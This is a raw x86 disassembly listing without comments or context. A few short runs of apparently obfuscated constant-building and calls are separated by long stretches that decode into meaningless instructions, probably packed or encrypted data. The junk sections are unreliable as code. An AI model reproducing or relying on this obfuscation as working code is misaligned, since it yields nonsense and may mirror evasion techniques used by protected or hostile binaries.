  41a1f7:	mov    esp,0x72424b2b
  41a1fc:	gs adc al,0xc8
  41a1ff:	fwait
  41a200:	sbb    DWORD PTR [eax+0x5147112e],esi
  41a206:	test   eax,ebp
  41a208:	frstor [esi+0x1525feb6]
  41a20e:	pop    edx
  41a20f:	pusha  
  41a210:	and    esi,ebp
  41a212:	mov    ebp,0x1e14de1f
  41a217:	dec    esi
  41a218:	xlat   BYTE PTR ds:[ebx]
  41a219:	sbb    BYTE PTR [esi+eiz*1+0x5d],bl
  41a21d:	and    eax,0x5d25332d
  41a222:	xor    al,BYTE PTR [eax]
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	inc    ebx
  41a2a1:	fcmovnu st,st(1)
  41a2a3:	mov    esp,0x1816ad2b
  41a2a8:	mov    esp,0x18181812
  41a2ad:	push   edx
  41a2ae:	or     eax,0x46cfa4e1
  41a2b3:	sbb    ah,BYTE PTR [ebx+0x4fc871ac]
  41a2b9:	dec    esi
  41a2ba:	xor    BYTE PTR [esp+ecx*4+0x736a3599],0x3e
  41a2c2:	ja     0x41a2de
  41a2c4:	lea    esp,[ebx+0x4d]
  41a2c7:	mov    esi,0x97453121
  41a2cc:	out    0x98,al
  41a2ce:	shl    DWORD PTR [ebx-0x31],1
  41a2d1:	adc    BYTE PTR [ebp-0x6c786479],ch
  41a2d7:	cdq    
  41a2d8:	xchg   esp,eax
  41a2d9:	nop
  41a2da:	xchg   ebx,eax
  41a2db:	loop   0x41a295
  41a2dd:	adc    al,0x5a
  41a2df:	jne    0x41a2dd
  41a2e1:	mov    WORD PTR [edi],cs
  41a2e3:	ss ins DWORD PTR es:[edi],dx
  41a2e5:	loopne 0x41a2ea
  41a2e7:	mov    edi,DWORD PTR [edi+0x6f]
  41a2ea:	pushf  
  41a2eb:	icebp  
  41a2ec:	dec    ebp
  41a2ed:	rcr    BYTE PTR [eax+0x26],1
  41a2f0:	sahf   
  41a2f1:	aas    
  41a2f2:	jbe    0x41a29b
  41a2f4:	std    
  41a2f5:	xor    DWORD PTR es:[esi-0x52db0dfa],0x43a83f09
  41a300:	jne    0x41a35b
  41a302:	ret    0x917
  41a305:	ds mov ebx,0x66185929
  41a30b:	inc    eax
  41a30c:	stc    
  41a30d:	stos   BYTE PTR es:[edi],al
  41a30e:	in     al,dx
  41a30f:	test   BYTE PTR [ebp+0x562a5a55],bh
  41a315:	bound  eax,QWORD PTR ds:[edi]
  41a318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a319:	add    al,0x6d
  41a31b:	dec    esi
  41a31c:	imul   ebx,DWORD PTR [esi+eiz*4],0x7602160d
  41a323:	por    mm6,QWORD PTR [ebp-0x1a]
  41a327:	inc    esi
  41a328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a329:	retf   0xd2
  41a32c:	sbb    dl,dl
  41a32e:	xchg   ebp,eax
  41a32f:	adc    al,0x96
  41a331:	xchg   ebx,eax
  41a332:	or     ebx,DWORD PTR [ecx-0x6c]
  41a335:	(bad)  
  41a336:	mov    WORD PTR [ecx-0x66],gs
  41a339:	pushf  
  41a33a:	stos   BYTE PTR es:[edi],al
  41a33b:	xor    BYTE PTR [esi*2+0x9788e6a],0xaf
  41a343:	or     dh,cl
  41a345:	xchg   esp,eax
  41a346:	ret    0xe8e5
  41a349:	iret   
  41a34a:	dec    eax
  41a34b:	out    dx,al
  41a34c:	xchg   esi,eax
  41a34d:	bound  esp,QWORD PTR [edi+0x18]
  41a350:	add    eax,0x8123c012
  41a355:	aaa    
  41a356:	pushaw 
  41a358:	or     ch,0xef
  41a35b:	add    al,0x59
  41a35d:	and    eax,0x76c47f12
  41a362:	cs addr16 sub eax,0xf6ea9121
  41a369:	scas   eax,DWORD PTR es:[edi]
  41a36a:	hlt    
  41a36b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a36c:	jne    0x41a392
  41a36e:	inc    esi
  41a36f:	pop    eax
  41a370:	cmp    BYTE PTR [ebx+0x4b],cl
  41a373:	into   
  41a374:	jae    0x41a35e
  41a376:	ret    0x3774
  41a379:	mov    ebp,0x3d29eb16
  41a37e:	cmp    eax,0x46d573c7
  41a383:	lods   al,BYTE PTR ds:[esi]
  41a384:	add    esp,DWORD PTR cs:[ecx+0x50]
  41a388:	je     0x41a30d
  41a38a:	mov    edx,0x497a7060
  41a38f:	xor    BYTE PTR [edi],dl
  41a391:	push   0xc4f0c24f
  41a396:	fild   WORD PTR [esi]
  41a398:	call   0x826c:0x40d211b2
  41a39f:	loope  0x41a3ab
  41a3a1:	jnp    0x41a349
  41a3a3:	shl    DWORD PTR [esi-0x73],cl
  41a3a6:	pop    ds
  41a3a7:	mov    ds:0xad66b5ac,al
  41a3ac:	jb     0x41a416
  41a3ae:	jmp    0x5f5d:0x34ee6641
  41a3b5:	sub    al,0x29
  41a3b7:	jo     0x41a38c
  41a3b9:	mov    al,ds:0xd503af78
  41a3be:	les    edx,FWORD PTR [edx+eax*4]
  41a3c1:	dec    esp
  41a3c2:	(bad)  
  41a3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3c4:	dec    edx
  41a3c5:	sub    DWORD PTR [esi-0x35],ebx
  41a3c8:	and    DWORD PTR [ebx],ebp
  41a3ca:	add    ch,bl
  41a3cc:	inc    ecx
  41a3cd:	dec    edi
  41a3ce:	jp     0x41a3d6
  41a3d0:	scas   al,BYTE PTR es:[edi]
  41a3d1:	mov    ecx,0xc8aa0b
  41a3d6:	ins    DWORD PTR es:[edi],dx
  41a3d7:	jne    0x41a3c6
  41a3d9:	sahf   
  41a3da:	repz shr BYTE PTR [eax-0x4ef1bc86],0x37
  41a3e2:	push   esp
  41a3e3:	dec    eax
  41a3e4:	mov    edi,0xb07be82e
  41a3e9:	out    dx,eax
  41a3ea:	jmp    0x41a44a
  41a3ec:	out    dx,al
  41a3ed:	sbb    ch,BYTE PTR [ebp-0x7998091d]
  41a3f3:	jmp    0x41a41b
  41a3f5:	mov    bh,BYTE PTR [edx-0x29]
  41a3f8:	sbb    ch,BYTE PTR [edi]
  41a3fa:	jmp    0x22ce:0x1fd8ff35
  41a401:	push   edx
  41a402:	fdivp  st(6),st
  41a404:	mov    al,0x98
  41a406:	mov    BYTE PTR [eax+eiz*1],ah
  41a409:	and    al,0xa6
  41a40b:	or     eax,0xd1ee4784
  41a410:	aaa    
  41a411:	into   
  41a412:	pop    ds
  41a413:	pusha  
  41a414:	pop    ebx
  41a415:	ret    0xd289
  41a418:	fadd   QWORD PTR [esi+0x349ae883]
  41a41e:	jmp    0x2087:0xe951377b
  41a425:	mov    ebp,0x984b3a7
  41a42a:	xchg   esi,eax
  41a42b:	mov    esi,0x3358308d
  41a430:	(bad)  
  41a431:	mov    dl,0x8a
  41a433:	imul   ebx,DWORD PTR [esi-0x6a],0x99463dd1
  41a43a:	out    0x5e,eax
  41a43c:	pushf  
  41a43d:	dec    edi
  41a43e:	popa   
  41a43f:	or     ah,bl
  41a441:	xchg   edx,eax
  41a442:	xor    BYTE PTR es:0x9f34c57a,bh
  41a449:	mov    edi,DWORD PTR [esi]
  41a44b:	sbb    al,ah
  41a44d:	pop    edx
  41a44e:	xlat   BYTE PTR ds:[ebx]
  41a44f:	rcr    DWORD PTR [edi-0x2b],0xbb
  41a453:	push   edx
  41a454:	icebp  
  41a455:	pop    edx
  41a456:	push   ebx
  41a457:	mov    cl,0x1f
  41a459:	sbb    al,0x40
  41a45b:	imul   esi,esi,0x7dac4bea
  41a461:	jo     0x41a46e
  41a463:	xchg   edi,eax
  41a464:	sbb    al,0xa3
  41a466:	lock mov ds:0x151053cf,al
  41a46c:	sbb    dl,BYTE PTR [ecx]
  41a46e:	pusha  
  41a46f:	inc    ecx
  41a470:	adc    DWORD PTR [ebp-0x6a],edi
  41a473:	xchg   edx,eax
  41a474:	sub    eax,DWORD PTR [ebp+0x9]
  41a477:	inc    eax
  41a478:	push   0xeacca753
  41a47d:	mov    dh,0x1e
  41a47f:	div    ebx
  41a481:	xchg   esi,eax
  41a482:	pop    edi
  41a483:	mov    eax,0x79ef86a5
  41a488:	out    0xa,al
  41a48a:	xchg   esi,eax
  41a48b:	xlat   BYTE PTR ds:[ebx]
  41a48c:	call   0x4501:0xeb6ae803
  41a493:	out    0x69,al
  41a495:	div    DWORD PTR [ebx]
  41a497:	mov    ebx,0xc45b4c97
  41a49c:	mov    eax,ds:0xa303c563
  41a4a1:	mov    WORD PTR [ecx],gs
  41a4a3:	add    eax,0x446c8173
  41a4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4a9:	push   ebp
  41a4aa:	sub    dl,BYTE PTR [edx]
  41a4ac:	mov    ?,WORD PTR [ebx-0x16]
  41a4af:	cmp    DWORD PTR [ebp-0x5],eax
  41a4b2:	int    0xd4
  41a4b4:	fwait
  41a4b5:	imul   eax,DWORD PTR [esi+0x4c],0x254c6efd
  41a4bc:	pop    esi
  41a4bd:	mov    cl,0x1a
  41a4bf:	clc    
  41a4c0:	enter  0x62b8,0xb7
  41a4c4:	pop    es
  41a4c5:	loope  0x41a513
  41a4c7:	xchg   ebx,eax
  41a4c8:	shl    DWORD PTR [esi+0x52],cl
  41a4cb:	mov    al,BYTE PTR [eax]
  41a4cd:	iret   
  41a4ce:	mov    ebp,0x664c6a47
  41a4d3:	mov    al,ds:0x24fea62e
  41a4d8:	scas   al,BYTE PTR es:[edi]
  41a4d9:	mov    bl,0x57
  41a4db:	pop    edi
  41a4dc:	ins    DWORD PTR es:[edi],dx
  41a4dd:	xchg   BYTE PTR [eax-0x6dcd8549],dh
  41a4e3:	adc    eax,0x78b2da6b
  41a4e8:	fs int 0x4
  41a4eb:	push   DWORD PTR [eax]
  41a4ed:	test   DWORD PTR [edx],ebp
  41a4ef:	inc    edi
  41a4f0:	cmp    al,0x11
  41a4f2:	mov    bh,0xdc
  41a4f4:	pop    es
  41a4f5:	fs inc ecx
  41a4f7:	fisttp DWORD PTR [eax+0x27]
  41a4fa:	mov    eax,ds:0xefe067f6
  41a4ff:	aam    0x33
  41a501:	fimul  WORD PTR [ecx+0x7a]
  41a504:	pop    eax
  41a505:	clc    
  41a506:	inc    edx
  41a507:	xchg   ebp,eax
  41a508:	dec    esi
  41a509:	sbb    edi,DWORD PTR [edi+0x5e27ff9c]
  41a50f:	mov    esp,0x614f68c2
  41a514:	xchg   ecx,eax
  41a515:	push   esi
  41a516:	jl     0x41a4aa
  41a518:	push   edx
  41a519:	mov    bl,0x6b
  41a51b:	pavgw  mm6,mm5
  41a51e:	out    dx,al
  41a51f:	ja     0x41a4ab
  41a521:	jecxz  0x41a4ed
  41a523:	fnop   
  41a525:	xchg   edx,eax
  41a526:	enter  0xfd07,0x88
  41a52a:	pop    esi
  41a52b:	fucomip st,st(3)
  41a52d:	aam    0xc7
  41a52f:	mov    eax,ds:0x292b72a7
  41a534:	xor    al,0xb7
  41a536:	mov    DWORD PTR [eax],edx
  41a538:	push   esp
  41a539:	or     ecx,edx
  41a53b:	and    al,0xa7
  41a53d:	int    0xa5
  41a53f:	pop    ax
  41a541:	xor    al,0x2
  41a543:	fs xchg esi,eax
  41a545:	inc    esi
  41a546:	orps   xmm5,XMMWORD PTR [esi+0x7b]
  41a54a:	fcmove st,st(1)
  41a54c:	adc    eax,0xe6c35702
  41a551:	bound  edx,QWORD PTR [edx-0x33adc953]
  41a557:	fwait
  41a558:	mov    WORD PTR [ebx],ss
  41a55a:	xchg   BYTE PTR [esi+0x53],bh
  41a55d:	cmc    
  41a55e:	sbb    esi,esi
  41a560:	or     DWORD PTR [esi],ebp
  41a562:	lods   eax,DWORD PTR ds:[esi]
  41a563:	mov    dl,0xdd
  41a565:	adc    BYTE PTR [eax],al
  41a567:	cli    
  41a568:	sbb    BYTE PTR [edi-0x288427d3],cl
  41a56e:	les    ecx,FWORD PTR [ecx+esi*1]
  41a571:	mov    bl,0x55
  41a573:	add    DWORD PTR [eax+0x6d],0x16
  41a577:	push   cs
  41a578:	retf   
  41a579:	dec    ebx
  41a57a:	xlat   BYTE PTR ds:[ebx]
  41a57b:	mov    eax,ss:0x2431d492
  41a581:	mov    dh,0xf7
  41a583:	jg     0x41a56a
  41a585:	xor    bl,bl
  41a587:	(bad)  
  41a588:	(bad)  [ebx-0x31f28f45]
  41a58e:	out    dx,al
  41a58f:	or     al,0x4f
  41a591:	imul   edx,esi,0xaa8eccfe
  41a597:	shl    BYTE PTR [ecx+edx*1],0x9
  41a59b:	dec    ebx
  41a59c:	addr16 add ebp,edi
  41a59f:	mov    ebx,0xdea5004b
  41a5a4:	shl    esp,1
  41a5a6:	pop    es
  41a5a7:	add    ecx,DWORD PTR [edi-0x59279944]
  41a5ad:	fnsave [esi]
  41a5af:	icebp  
  41a5b0:	js     0x41a552
  41a5b2:	mov    eax,0xefd03479
  41a5b7:	int    0x7f
  41a5b9:	hlt    
  41a5ba:	add    esi,DWORD PTR [edx+0x1461853e]
  41a5c0:	mov    al,0x95
  41a5c2:	sub    BYTE PTR [ecx+eiz*4],cl
  41a5c5:	xchg   edx,eax
  41a5c6:	data16 add ch,BYTE PTR [ebp+0x57cfb723]
  41a5cd:	push   eax
  41a5ce:	jp     0x41a5da
  41a5d0:	ret    
  41a5d1:	aaa    
  41a5d2:	in     al,dx
  41a5d3:	pop    ebp
  41a5d4:	and    ch,BYTE PTR [eax-0x51]
  41a5d7:	dec    ebp
  41a5d8:	and    BYTE PTR [ecx-0x69],al
  41a5db:	sahf   
  41a5dc:	mov    DWORD PTR [ebp-0xa4ceed5],0x504efb4a
  41a5e6:	jno    0x41a56a
  41a5e8:	retf   
  41a5e9:	iret   
  41a5ea:	jmp    0x41a58d
  41a5ec:	inc    edi
  41a5ed:	test   DWORD PTR [ebx+edx*1],0x35d6f50c
  41a5f4:	and    BYTE PTR [edi+0x3b],0x27
  41a5f8:	pop    edi
  41a5f9:	xor    eax,0x337d7e38
  41a5fe:	jmp    0x1616:0xfc97412e
  41a605:	sti    
  41a606:	pop    ds
  41a607:	xchg   ebx,eax
  41a608:	pop    ss
  41a609:	mov    edx,0xa866415a
  41a60e:	mov    ds:0xe3bab527,al
  41a613:	fwait
  41a614:	aad    0xa6
  41a616:	dec    ebx
  41a617:	(bad)  
  41a618:	cmp    edx,DWORD PTR [ebp+0x5]
  41a61b:	xchg   esi,eax
  41a61c:	add    eax,0x2408acc3
  41a621:	mov    edi,0x70b95300
  41a626:	jbe    0x41a5b9
  41a628:	lahf   
  41a629:	and    eax,0x23bfb7fd
  41a62e:	test   DWORD PTR [edx-0x3be90964],ecx
  41a634:	hlt    
  41a635:	daa    
  41a636:	aad    0x34
  41a638:	push   cs
  41a639:	push   es
  41a63a:	retf   0xcc77
  41a63d:	repz sub eax,DWORD PTR [edx+0x0]
  41a641:	adc    al,0x47
  41a643:	pushf  
  41a644:	cli    
  41a645:	lods   eax,DWORD PTR ds:[esi]
  41a646:	push   esp
  41a647:	mov    ds:0x60c4ff05,eax
  41a64c:	mov    ss,WORD PTR [ebp+ebx*2+0x24]
  41a650:	cmp    eax,ebx
  41a652:	dec    esp
  41a653:	dec    ecx
  41a654:	(bad)  
  41a655:	jb     0x41a636
  41a657:	popf   
  41a658:	add    DWORD PTR [esi-0x2dcf7c5d],esp
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x42202e
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	dec    esi
  41a749:	sbb    BYTE PTR [ecx+0x16a5cf7c],cl
  41a74f:	sbb    BYTE PTR [edx+edx*1-0x2158e7e8],bh
  41a756:	int    0xde
  41a758:	mov    esi,0x8684a352
  41a75d:	pusha  
  41a75e:	dec    esp
  41a75f:	(bad)  
  41a760:	out    dx,eax
  41a761:	pop    eax
  41a762:	jo     0x41a6e8
  41a764:	fisubr WORD PTR [ebx+0x4f]
  41a767:	(bad)  
  41a768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a769:	mov    bl,0x84
  41a76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a76c:	nop
  41a76d:	pusha  
  41a76e:	cli    
  41a76f:	fstp   DWORD PTR [ecx+0x52]
  41a772:	inc    DWORD PTR [eax]
  41a774:	loopne 0x41a7a6
  41a776:	mov    al,0xe9
  41a778:	imul   ecx,DWORD PTR ds:0x7620a9e1,0x1b
  41a77f:	adc    DWORD PTR [ebx+edi*4],0xb52b7bc4
  41a786:	pop    esp
  41a787:	ss jmp 0x41a722
  41a78a:	outs   dx,DWORD PTR ds:[esi]
  41a78b:	fist   DWORD PTR [eax+edi*8+0x5b]
  41a78f:	sbb    dl,BYTE PTR [edx-0x6a935fc8]
  41a795:	mov    DWORD PTR [ecx-0x6b],eax
  41a798:	cmp    eax,0x4bc77167
  41a79d:	xor    bl,BYTE PTR [ecx]
  41a79f:	sub    ah,bl
  41a7a1:	jl     0x41a75c
  41a7a3:	or     dl,BYTE PTR [edi+0x46d4d437]
  41a7a9:	dec    esp
  41a7aa:	sbb    eax,0x80a2229e
  41a7af:	xchg   ebp,eax
  41a7b0:	daa    
  41a7b1:	dec    eax
  41a7b2:	sub    BYTE PTR [ebx-0x43],bh
  41a7b5:	mov    edx,0x119a77ab
  41a7ba:	xor    eax,0x7c54cbb3
  41a7bf:	mov    edi,0x6e47f026
  41a7c4:	dec    edx
  41a7c5:	cmc    
  41a7c6:	inc    edx
  41a7c7:	jno    0x41a827
  41a7c9:	adc    eax,0xced254f7
  41a7ce:	aad    0x1a
  41a7d0:	pop    edx
  41a7d1:	call   0x7685:0xd48b3b8f
  41a7d8:	cwde   
  41a7d9:	adc    cl,al
  41a7db:	je     0x41a7c9
  41a7dd:	mov    esi,0xb107e590
  41a7e2:	sar    BYTE PTR ds:0x6d10f86,1
  41a7e8:	pop    ss
  41a7e9:	cmc    
  41a7ea:	inc    edx
  41a7eb:	jp     0x41a7a2
  41a7ed:	xchg   esi,eax
  41a7ee:	mov    ebx,0xa2020bf1
  41a7f3:	and    eax,0x8a027304
  41a7f8:	mov    edi,edi
  41a7fa:	dec    esp
  41a7fb:	icebp  
  41a7fc:	add    BYTE PTR [edx+0x6],dh
  41a7ff:	pop    ebx
  41a800:	arpl   si,di
  41a802:	jnp    0x41a796
  41a804:	rcl    DWORD PTR [ecx+0x7ec6f210],cl
  41a80a:	cli    
  41a80b:	sbb    al,0xe1
  41a80d:	and    BYTE PTR [ebx+0x7],dh
  41a810:	mov    dh,0x2
  41a812:	xchg   ebx,eax
  41a813:	std    
  41a814:	adc    ch,bh
  41a816:	ret    0xa6a6
  41a819:	ja     0x41a810
  41a81b:	in     al,0x71
  41a81d:	stos   BYTE PTR es:[edi],al
  41a81e:	jge    0x41a835
  41a820:	mov    edi,0x32f8124d
  41a825:	adc    DWORD PTR [edi+0x29ff89b2],ebp
  41a82b:	xor    bh,dl
  41a82d:	cmp    ecx,DWORD PTR [edi-0x2e332c73]
  41a833:	jne    0x41a878
  41a835:	mov    dl,0x6f
  41a837:	pop    ss
  41a838:	dec    esi
  41a839:	jo     0x41a86b
  41a83b:	repnz out dx,al
  41a83d:	push   edi
  41a83e:	rcr    cl,0x7c
  41a841:	add    esi,DWORD PTR ds:0x77381ef
  41a847:	mov    bl,0xc4
  41a849:	outs   dx,DWORD PTR ds:[esi]
  41a84a:	cmp    DWORD PTR ds:0xf6bd40bd,edx
  41a850:	inc    edi
  41a851:	lea    ecx,[eax]
  41a853:	xchg   BYTE PTR [edi+0x394a570c],al
  41a859:	jbe    0x41a8c4
  41a85b:	je     0x41a802
  41a85d:	xchg   ebx,eax
  41a85e:	lahf   
  41a85f:	xlat   BYTE PTR ds:[ebx]
  41a860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a861:	inc    esp
  41a862:	pop    es
  41a863:	gs dec eax
  41a865:	sbb    eax,0xe7c943
  41a86a:	call   0x75:0xc818836e
  41a871:	add    BYTE PTR [ebx+edi*4-0x7609c18b],ah
  41a878:	inc    edi
  41a879:	cmp    eax,0x560e6725
  41a87e:	enter  0x3101,0xf0
  41a882:	push   edx
  41a883:	push   eax
  41a884:	out    dx,al
  41a885:	sub    DWORD PTR [edi],esi
  41a887:	jl     0x41a8c0
  41a889:	xor    cl,al
  41a88b:	inc    si
  41a88d:	leave  
  41a88e:	jae    0x41a8e8
  41a890:	xor    eax,0x1ab74620
  41a895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a896:	mul    DWORD PTR [ebx+0x45aca907]
  41a89c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a89d:	cwde   
  41a89e:	(bad)  
  41a89f:	leave  
  41a8a0:	aas    
  41a8a1:	rcr    DWORD PTR [edx],0x4b
  41a8a4:	fcmove st,st(6)
  41a8a6:	rcl    bh,cl
  41a8a8:	int    0x1a
  41a8aa:	(bad)  
  41a8ab:	sub    bh,bl
  41a8ad:	lods   al,BYTE PTR ds:[esi]
  41a8ae:	icebp  
  41a8af:	inc    eax
  41a8b0:	scas   al,BYTE PTR es:[edi]
  41a8b1:	push   ecx
  41a8b2:	mov    ebp,DWORD PTR [edi]
  41a8b4:	jae    0x41a925
  41a8b6:	sbb    edx,DWORD PTR [esi-0x16]
  41a8b9:	gs sub eax,0x6218b7e9
  41a8bf:	mov    WORD PTR [edx-0x75536f6f],es
  41a8c5:	and    esp,0x14
  41a8c8:	dec    ebx
  41a8c9:	and    edi,DWORD PTR [ecx-0x44]
  41a8cc:	and    eax,0xc8843e36
  41a8d1:	inc    eax
  41a8d2:	je     0x41a88d
  41a8d4:	aam    0xee
  41a8d6:	mov    edi,0x18b97a2a
  41a8db:	xchg   ecx,eax
  41a8dc:	cli    
  41a8dd:	add    BYTE PTR [edi],ch
  41a8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8e0:	shl    BYTE PTR [eax+0x201d16c1],0x27
  41a8e7:	out    dx,eax
  41a8e8:	inc    ebp
  41a8e9:	and    al,0xe6
  41a8eb:	pop    eax
  41a8ec:	fwait
  41a8ed:	push   ds
  41a8ee:	push   ebx
  41a8ef:	popf   
  41a8f0:	dec    ebp
  41a8f1:	test   DWORD PTR [ebx+ebx*4+0x6d3929c6],esi
  41a8f8:	cdq    
  41a8f9:	out    dx,al
  41a8fa:	into   
  41a8fb:	lods   eax,DWORD PTR ds:[esi]
  41a8fc:	je     0x41a8c9
  41a8fe:	xor    al,0xae
  41a900:	daa    
  41a901:	inc    DWORD PTR [esi+esi*4]
  41a904:	pop    ebp
  41a905:	fisub  WORD PTR [ebp+0x603babe1]
  41a90b:	mov    eax,0x67a32a5e
  41a910:	fcmovu st,st(2)
  41a912:	cmp    eax,0xdb0c72b7
  41a917:	in     al,dx
  41a918:	mov    ch,BYTE PTR [esi-0x6f]
  41a91b:	into   
  41a91c:	mov    dh,0xa8
  41a91e:	cmp    al,0x11
  41a920:	jae    0x41a8e8
  41a922:	scas   al,BYTE PTR es:[edi]
  41a923:	bound  edx,QWORD PTR [ebp-0x20]
  41a926:	scas   eax,DWORD PTR es:[edi]
  41a927:	ins    BYTE PTR es:[edi],dx
  41a928:	nop
  41a929:	popa   
  41a92a:	shr    DWORD PTR [ecx-0xe],1
  41a92d:	je     0x41a8da
  41a92f:	jmp    0x41a941
  41a931:	mov    ah,0x6b
  41a933:	mov    dl,BYTE PTR [ebx-0x57f512e0]
  41a939:	pop    ds
  41a93a:	pop    ebx
  41a93b:	int3   
  41a93c:	xchg   ch,dl
  41a93e:	push   0xffffffae
  41a940:	ret    0xa4e1
  41a943:	repz push edx
  41a945:	jne    0x41a917
  41a947:	out    dx,eax
  41a948:	ret    0x2c5c
  41a94b:	dec    edi
  41a94c:	push   ebp
  41a94d:	cmp    bh,bh
  41a94f:	dec    ebx
  41a950:	jmp    0x41a970
  41a952:	inc    ebx
  41a953:	shr    esi,0xdc
  41a956:	popf   
  41a957:	test   eax,0x83afa1d4
  41a95c:	cmp    DWORD PTR [esi+0x23a7cb17],esi
  41a962:	mov    DWORD PTR [ebx-0x8847c84],ebx
  41a968:	ins    BYTE PTR es:[edi],dx
  41a969:	inc    eax
  41a96a:	pop    es
  41a96b:	out    0x47,al
  41a96d:	inc    ebx
  41a96e:	jb     0x41a93f
  41a970:	test   al,0x69
  41a972:	pop    ds
  41a973:	clc    
  41a974:	ss push eax
  41a976:	int    0xf3
  41a978:	rdmsr  
  41a97a:	and    eax,0x4d0ec81e
  41a97f:	adc    DWORD PTR ds:0xeb88c89b,edx
  41a985:	push   edx
  41a986:	lahf   
  41a987:	mov    ah,0x2c
  41a989:	pushf  
  41a98a:	loope  0x41a9ff
  41a98c:	enter  0x85af,0x1
  41a990:	bound  ecx,QWORD PTR [ecx]
  41a992:	mov    dl,0xb0
  41a994:	lahf   
  41a995:	push   esi
  41a996:	ret    0xef5
  41a999:	and    DWORD PTR [eax+0x4d],edx
  41a99c:	mov    ds:0x83cdb961,eax
  41a9a1:	nop
  41a9a2:	adc    al,0xea
  41a9a4:	imul   edi,DWORD PTR [ebx-0x50],0xaa06866c
  41a9ab:	lods   eax,DWORD PTR ds:[esi]
  41a9ac:	sub    al,0x6b
  41a9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9af:	push   ebx
  41a9b0:	pop    edx
  41a9b1:	adc    al,0x96
  41a9b3:	xchg   BYTE PTR [eax+0x26cf61fd],ch
  41a9b9:	test   al,0x58
  41a9bb:	and    ch,bh
  41a9bd:	popa   
  41a9be:	dec    esi
  41a9bf:	jae    0x41a95c
  41a9c1:	pop    ebx
  41a9c2:	sbb    ebp,DWORD PTR [edi-0x59e1fd50]
  41a9c8:	xor    DWORD PTR [edi+0x69],edx
  41a9cb:	adc    al,0xfc
  41a9cd:	dec    edx
  41a9ce:	mov    al,ds:0xb495b097
  41a9d3:	or     esp,DWORD PTR [edx]
  41a9d5:	shr    eax,0xa2
  41a9d8:	int    0x5d
  41a9da:	push   0x57
  41a9dc:	scas   al,BYTE PTR es:[edi]
  41a9dd:	jmp    0x6a3f728e
  41a9e2:	pop    esi
  41a9e3:	call   0xedaa2dab
  41a9e8:	test   eax,0x30ccb5d0
  41a9ed:	xor    eax,0x17ec40c
  41a9f2:	in     al,0x4a
  41a9f4:	imul   eax,DWORD PTR [edx-0x59839364],0xfffffffc
  41a9fb:	mov    eax,ds:0x76fda245
  41aa00:	inc    edx
  41aa01:	sub    bh,dh
  41aa03:	fbld   TBYTE PTR [eax]
  41aa05:	nop
